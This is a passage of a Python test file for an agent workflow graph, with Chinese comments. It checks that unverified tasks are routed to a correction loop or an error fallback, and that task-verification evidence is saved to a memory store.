        state["tool_result"] = {"ok": True, "status": "success", "data": {"path": str(p)}}
        res = post_validate_gate(state)
        assert res["task_verified"] is True
        assert "last_error" not in res

    def test_unverified_routes_to_correction_loop(self, tmp_path):
        from app.services.graph.graph import route_after_validate
        state = init_state("生成页面")
        state["tool_name"] = "content:generate"
        state["task_verified"] = False
        state["last_error"] = "Validation Gate: 任务完成校验未通过"
        state["error_type"] = ERROR_TYPE_BUSINESS
        state["correction_loop_count"] = 0
        target = route_after_validate(state)
        # 校正循环未耗尽 → 进入重写输入重试
        assert target == "rewrite_agent_input_node"

    def test_unverified_routes_to_fallback_after_loop_exhausted(self, tmp_path):
        from app.services.graph.graph import route_after_validate
        state = init_state("生成页面")
        state["tool_name"] = "content:generate"
        state["task_verified"] = False
        state["last_error"] = "Validation Gate: 任务完成校验未通过"
        state["error_type"] = ERROR_TYPE_BUSINESS
        state["correction_loop_count"] = 2
        state["max_correction_loop"] = 2
        target = route_after_validate(state)
        assert target == "error_fallback_node"


class TestMemoryPersistVerificationWriteback:
    """M15 执行闭环：memory_persist_node 把验证结果作为 C 级证据落盘。"""

    def test_persist_writes_task_verification_evidence(self, tmp_path, monkeypatch):
        from app.services.graph.memory_store import MemoryStore
        from app.services.graph import nodes as nodes_mod

        base = MemoryStore(store_dir=str(tmp_path / "mem_v"))
        monkeypatch.setattr("app.services.graph.memory_store.get_memory_store", lambda: base)

        state = init_state("生成页面", user_id="v_user")
        state["tool_name"] = "content:generate"
        state["trace_id"] = "trace_v_1"
        state["task_verified"] = True
        state["completion_evidence"] = {
            "tool_name": "content:generate",
            "task_verified": True,
            "evidence_level": "user",
            "source": "user",
            "checks": {"output_file_exists": True, "output_file_size": 2},
        }
        state["tool_result"] = {"ok": True}
        out = asyncio.run(nodes_mod.memory_persist_node(state))
        assert out["evidence"]["task_verified"] is True
        # 找到落盘的 C 级验证证据
        keys = base.list_keys("v_user")
        v_keys = [k for k in keys if k.startswith("task_verification_C_")]
        assert len(v_keys) == 1
        rec = base.get("v_user", v_keys[0])
        assert rec["value"]["task_verified"] is True
        assert rec["value"]["checks"]["output_file_exists"] is True
        assert rec["level"] == "C"
        assert rec["value"]["trace_id"] == "trace_v_1"

